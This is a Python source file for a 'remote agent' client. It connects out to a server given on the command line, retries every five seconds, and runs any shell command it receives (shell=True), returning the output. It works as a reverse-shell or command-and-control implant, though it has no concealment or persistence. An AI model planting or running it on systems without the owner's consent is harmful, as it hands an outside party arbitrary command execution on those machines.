import socket
import subprocess
import sys
import threading
import json
import os

class RemoteAgent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.client_socket = None
        self.running = True

    def connect(self):
        while self.running:
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_host, self.server_port))
                print(f"[*] Connected to server {self.server_host}:{self.server_port}")
                self.handle_connection()
            except Exception as e:
                print(f"[*] Connection failed, retrying in 5s... ({e})")
                self.client_socket = None
                import time
                time.sleep(5)

    def handle_connection(self):
        while self.running:
            try:
                data = self.client_socket.recv(4096)
                if not data:
                    break
                message = json.loads(data.decode())
                self.execute_command(message)
            except Exception as e:
                print(f"[*] Error: {e}")
                break
        
        self.client_socket = None
        print("[*] Disconnected")

    def execute_command(self, message):
        cmd = message.get("command", "")
        cmd_id = message.get("id", "")
        
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=300
            )
            output = result.stdout + result.stderr
            status = "success" if result.returncode == 0 else "failed"
        except Exception as e:
            output = str(e)
            status = "error"
        
        response = {
            "id": cmd_id,
            "status": status,
            "output": output,
            "returncode": result.returncode if 'result' in locals() else -1
        }
        
        try:
            self.client_socket.send(json.dumps(response).encode())
        except:
            pass

    def start(self):
        print("[*] Remote Agent starting...")
        self.connect()

    def stop(self):
        self.running = False
        if self.client_socket:
            self.client_socket.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python client.py <server_host> <server_port>")
        print("Example: python client.py 192.168.1.100 5555")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    agent = RemoteAgent(host, port)
    agent.start()